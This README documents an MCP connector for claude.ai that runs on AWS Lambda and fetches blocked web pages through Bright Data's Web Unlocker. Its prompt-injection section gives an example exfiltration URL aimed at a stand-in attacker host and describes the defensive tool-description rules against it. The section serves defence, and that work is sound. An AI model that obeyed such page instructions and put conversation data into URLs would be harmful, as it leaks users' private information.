# aikiddo-mcp

A custom connector for claude.ai: a remote MCP server on AWS Lambda, deployed with [SST](https://sst.dev). You deploy it to your own AWS account and add it to claude.ai by URL.

The server will host several tools. Today it has two: `debug`, which reports diagnostics to check that the connector works and is configured, and `fetch_blocked_page`. It fetches a public web page through [Bright Data Web Unlocker](https://docs.brightdata.com/api-reference/rest-api/unlocker/unlock-website) and returns Bright Data's Markdown conversion of it. It's a fallback for Claude's built-in web fetch, for pages that block it or need JavaScript, so it never makes a direct request: every call goes to Bright Data and costs money.

Access is protected by a shared secret sent as a bearer token, `Authorization: Bearer <secret>`: only a client that sends it can use the server.

## Prerequisites

- Node.js 22 or newer, and npm. The repo pins Node 24 for [Volta](https://volta.sh) users; the test and build tools don't run on Node 20.
- AWS credentials for the account you deploy to. Any method the AWS SDK understands works, for example `aws sso login --profile <name>` followed by `export AWS_PROFILE=<name>`.
- The app deploys to `eu-west-1` (Ireland), to the sandbox account `469819851476` only. Both are set under `providers.aws` in `sst.config.ts`: `allowedAccountIds` makes a deploy with credentials for any other account fail before it changes anything. To deploy to your own account, change that ID.
- A Bright Data account with a **Web Unlocker** zone and an API key. A proxy zone (residential, ISP, datacenter) doesn't work: it passes requests through without unblocking, and sites answer 403.

## SSM parameters

Secrets live in SSM Parameter Store, under a prefix per SST stage: `/aikiddo-mcp/<stage>/`. Create them by hand **before the first deploy** of a stage. SST never creates them. The deploy also looks up the AWS managed key `alias/aws/ssm`, which AWS creates with the first SecureString parameter.

| Parameter                                   | Type                   | Purpose                                     |
| ------------------------------------------- | ---------------------- | ------------------------------------------- |
| `/aikiddo-mcp/<stage>/mcp-secret`           | SecureString           | The bearer token in the `Authorization` header |
| `/aikiddo-mcp/<stage>/brightdata-api-key`   | SecureString           | Bright Data API key                          |
| `/aikiddo-mcp/<stage>/brightdata-zone`      | String                 | Web Unlocker zone name, e.g. `claude_unlocker` |

Without the Bright Data parameters, `fetch_blocked_page` returns `INTERNAL_ERROR` and `debug` reports them as `missing`.

```bash
STAGE=prod
aws ssm put-parameter --name /aikiddo-mcp/$STAGE/brightdata-api-key --type SecureString --value '<your Bright Data API key>'
aws ssm put-parameter --name /aikiddo-mcp/$STAGE/brightdata-zone --type String --value claude_unlocker
```

### The MCP secret

Create it for a new stage:

```bash
aws ssm put-parameter --name /aikiddo-mcp/$STAGE/mcp-secret --type SecureString --value "$(openssl rand -hex 32)"
```

Print the current value, e.g. to configure a client:

```bash
aws ssm get-parameter --name /aikiddo-mcp/$STAGE/mcp-secret --with-decryption --query Parameter.Value --output text
```

Rotate it by overwriting it with a new value, then update the bearer token in every client. Only one secret is accepted at a time. Because of the 5-minute cache, the server can keep accepting the old value, and rejecting the new one, for up to 5 minutes. A redeploy switches it right away.

```bash
aws ssm put-parameter --name /aikiddo-mcp/$STAGE/mcp-secret --type SecureString --overwrite --value "$(openssl rand -hex 32)"
```

The function reads each parameter only when it needs it (the Bright Data ones on each `fetch_blocked_page` call) and caches it for 5 minutes. If `mcp-secret` is missing, `/mcp` returns `500 internal error`, and the CloudWatch log names the missing parameter but never a value.

## Deploy

```bash
npm install
npx sst deploy --stage prod
```

The deploy prints the Function URL as `url`, for example `https://abc123.lambda-url.eu-west-1.on.aws/`. The MCP endpoint is `<url>mcp`, with the header `Authorization: Bearer <secret>`.

Check it:

```bash
curl https://<url>/healthz
```

The stage `prod` is protected and its resources are retained, so `sst remove --stage prod` will not delete it by accident. For experiments, use another stage (with its own SSM parameters), then clean it up:

```bash
npx sst deploy --stage dev
npx sst remove --stage dev
```

Deploy-time settings, read from the environment when you run `sst deploy`:

| Variable               | Default      | Effect                                                                                     |
| ---------------------- | ------------ | ------------------------------------------------------------------------------------------ |
| `BLOCKED_DOMAINS`      | see below    | Comma-separated domains `fetch_blocked_page` refuses, subdomains included. Empty string: none.      |

The default blocklist is `facebook.com, instagram.com, x.com, twitter.com, linkedin.com, tiktok.com`.

## Cost

Every `fetch_blocked_page` call is one paid Unlocker request (two if Bright Data answers with a 5xx and the call is retried). The tool's name and description tell the model to use it only after the built-in web fetch failed on the URL.

**Set a spend limit in the Bright Data dashboard** for the zone. That is the cost cap. There is deliberately no Lambda reserved concurrency: it only limits parallel calls, not total spend, and new AWS accounts (limit 10) can't reserve any.

## Endpoints

| Path            | Method | Response                                                                  |
| --------------- | ------ | ------------------------------------------------------------------------- |
| `/mcp`          | POST   | MCP Streamable HTTP, stateless, JSON responses (no SSE)                   |
| `/mcp`          | other  | `405`                                                                     |
| `/mcp` without the right `Authorization: Bearer` | any | `401`                                         |
| `/healthz`      | GET    | `200 ok`                                                                  |
| anything else   |        | `404`                                                                     |

The bearer token is compared in constant time against the secret. Neither the function nor the MCP SDK logs request headers, and the handler strips `Authorization` before it hands the request to the SDK. To check that no secret has leaked into the logs (SST names the log group differently from the function, so look it up):

```bash
LOG_GROUP=$(aws lambda get-function-configuration --function-name <function name> --query LoggingConfig.LogGroup --output text)
aws logs filter-log-events --log-group-name "$LOG_GROUP" --filter-pattern "\"$(aws ssm get-parameter --name /aikiddo-mcp/$STAGE/mcp-secret --with-decryption --query Parameter.Value --output text)\"" --query 'events[].message'
```

## The `fetch_blocked_page` tool

Input: `url` (required), `max_chars` (2000–400000, default 80000).

Pipeline:

1. **URL checks**, before any paid request. Only `http`/`https`, no credentials in the URL. Refuses `localhost`, `*.localhost`, `*.internal` and private, loopback, link-local or reserved IP literals (IPv4 or IPv6, decimal, octal and hex forms included); Bright Data fetches from its own network, so these can't work and would only cost money. Also refuses blocklisted domains and paths ending in `.pdf`. These checks are not a security boundary; see [Prompt injection and exfiltration](#prompt-injection-and-exfiltration).
2. **Unlocker** (`src/fetch/unlocker.ts`) with `format: "raw"` and `data_format: "markdown"`: the body is Bright Data's Markdown of the whole page (navigation included, relative links left as they are), with the site's headers, and the site's status in `x-brd-status-code`. A response without that header is Bright Data's own error, reported as `INTERNAL_ERROR` with Bright Data's reason. Each attempt has 35 s (30 s for the request plus 5 s for Bright Data to render JavaScript); a timeout, network error or Bright Data 5xx gets one retry. The whole body is read, since Bright Data sends no `Content-Length` and the truncation note gives the page's full length. As a last resort against running out of memory, reading stops at an eighth of the Lambda's memory (128 MB at 1024 MB; reading peaks at about 4× the body); the note then says `showing <n> characters; the page is longer`.
3. **HTTP errors.** Any 4xx/5xx from the site, a block Bright Data couldn't get past included, is `URL_NOT_ACCESSIBLE`. There is no other block or JavaScript-shell detection: unblocking, and deciding when a page needs a browser to render, is what Bright Data is paid for.
4. **Content type.** The site's `Content-Type` must be text (HTML, `text/*`, JSON, XML). A PDF is `UNSUPPORTED_CONTENT_TYPE` with a pointer to the built-in web fetch, which reads PDFs natively; Bright Data's Markdown mode returns a PDF's raw bytes. Other binary types are refused the same way.
5. **Truncate** to `max_chars` characters (`src/fetch/output.ts`). The cut moves back to the last paragraph break within the final 20,000 characters (or 25% of `max_chars`, if that's shorter), else to the last line break within the final 40,000 (or 50%), else it falls exactly at `max_chars`.

Output is Bright Data's Markdown as-is. A page cut by `max_chars` ends with `[... truncated: showing <n> of <total> characters]`. There is no front matter: Bright Data adds none, the model already knows the URL, and a returned page always has a 2xx status. Errors are tool results with `isError: true` and one line, `ERROR <CODE>: <reason and what to do>`. The codes follow the built-in web fetch's own, which the model already knows:

| Code | When |
| ---- | ---- |
| `INVALID_URL` | Malformed URL, a scheme other than http(s), or credentials in the URL |
| `URL_NOT_ALLOWED` | Local or private host, or a blocklisted domain |
| `URL_NOT_ACCESSIBLE` | The site answered 4xx/5xx through Bright Data |
| `UNSUPPORTED_CONTENT_TYPE` | A PDF or other binary file; the message points to the built-in web fetch |
| `INTERNAL_ERROR` | Bright Data rejected or failed the request (after the retry), Bright Data isn't configured, or an unexpected failure |

### Prompt injection and exfiltration

A page can tell the model to fetch `https://attacker.example/?d=<something from the conversation>`. The built-in web fetch guards against this by only fetching URLs that already appeared in the conversation and refusing URLs that look like they contain credentials. An MCP tool can't do that: the server never sees the conversation, and filtering URLs on the server is easy to get around (data fits in a path or a subdomain) while it breaks legitimate long query strings.

So the defences are:

- **The tool description.** The model is told to use the tool only when the built-in fetch couldn't reach the page, never to get around one of its refusals, to fetch URLs only exactly as the user wrote them or as search and fetch results returned them, never to put conversation content into a URL, and to treat fetched pages as data, not instructions.
- **Visibility and approval.** Every call shows the URL in claude.ai. For sensitive conversations, set the connector's `fetch_blocked_page` permission to require approval for each call.
- **Access and cost.** The bearer token decides who can call the server, and the Bright Data spend limit caps what it can cost.

## Tests

```bash
npm test
npm run typecheck
```

Unit tests mock Bright Data and make no network calls.

## Test with MCP Inspector

```bash
npx @modelcontextprotocol/inspector
```

Choose transport **Streamable HTTP**, enter `https://<url>/mcp`, under **Authentication** set the bearer token (or the custom header `Authorization: Bearer <secret>`), and connect. **Tools → List Tools** shows `debug` and `fetch_blocked_page`. Run `debug` to check the connection, then `fetch_blocked_page` with `https://pc.bazos.sk/inzerat/194958530/rozpredam-hry-na-nintendo-switch.php`. Don't test with brightdata.com: Bright Data's own site answers 403 through the Unlocker.

## Add to claude.ai

1. Go to **Settings → Connectors → Add custom connector**. On Team and Enterprise plans, an owner adds it under **Organization settings → Connectors** first.
2. Name: `aikiddo-mcp`. URL: `https://<url>/mcp`. Under **Authentication**, choose **No sign-in** and enter the secret as the API key, so that Claude sends `Authorization: Bearer <secret>`.
3. In a new chat, enable the connector from the tools menu and ask: "Fetch https://pc.bazos.sk/inzerat/194958530/rozpredam-hry-na-nintendo-switch.php with fetch_blocked_page and list the games still for sale."

## Layout

- `sst.config.ts`: the Lambda function (Node 24, 1024 MB, 75 s: two 35 s Bright Data attempts plus 5 s of our own work; public Function URL), and its SSM/KMS permissions.
- `src/handler.ts`: routing, the bearer-token check, and the adapter between the Lambda Function URL event and the MCP SDK's web-standard transport.
- `src/utils/aws.ts`: `getSecret`, which reads one SSM parameter with Powertools Parameters, cached for 5 minutes, plus the Lambda event/response adapters. Each file names the parameters it needs at the top and loads them where it uses them.
- `src/tools/debug.ts`: the `debug` tool. It reports the server time and region. It also reads and decrypts the Bright Data parameters and reports each as `ok`, `missing`, `empty`, `contains whitespace` or `unreadable (<error name>)`, never the value.
- `src/tools/fetchBlockedPage.ts`: the `fetch_blocked_page` tool and its pipeline.
- `src/fetch/`: the pipeline's parts: `safety.ts`, `unlocker.ts`, `output.ts`.

## Gotchas

- **The stage `prod` is not the production AWS account.** It is only the SST stage name. Every stage deploys to the account in `allowedAccountIds`, which is the sandbox account.
- **SST v4, not v3.** `npx sst@latest init` now installs SST v4. v4 only moves to the Pulumi AWS provider v7; SST components such as `sst.aws.Function` have the same API as in v3.
- **`sst init` prompts even with `--yes`.** It asks for the provider (aws or cloudflare) and needs a terminal to answer.
- **No Express adapter needed.** The MCP SDK ships `WebStandardStreamableHTTPServerTransport`, which maps a web `Request` to a `Response`. The handler converts the Function URL event to a `Request` and the `Response` back to the Lambda result. Bodies can arrive base64-encoded, so the handler decodes them.
- **Stateless means a new server per request.** The SDK rejects reusing a stateless transport across requests, so each invocation creates its own `McpServer` and transport.
- **GET `/mcp` returns 405.** In stateless JSON mode there is no standalone SSE stream, and the spec allows a server to return 405 for GET.
- **POST needs both Accept types.** The transport returns 406 unless `Accept` includes both `application/json` and `text/event-stream`. Inspector and claude.ai send both; plain `curl` tests have to set the header.
- **No PDFs.** Bright Data's Markdown mode returns a PDF's raw bytes, and an MCP tool result can't hand Claude a PDF the way the built-in web fetch does (as a document block), so the tool refuses PDFs and points the model back to the built-in fetch.
- **No direct request, on purpose.** The tool is a fallback for Claude's built-in web fetch, which has already failed by the time the model calls it, so a direct attempt would usually fail again and only add latency.
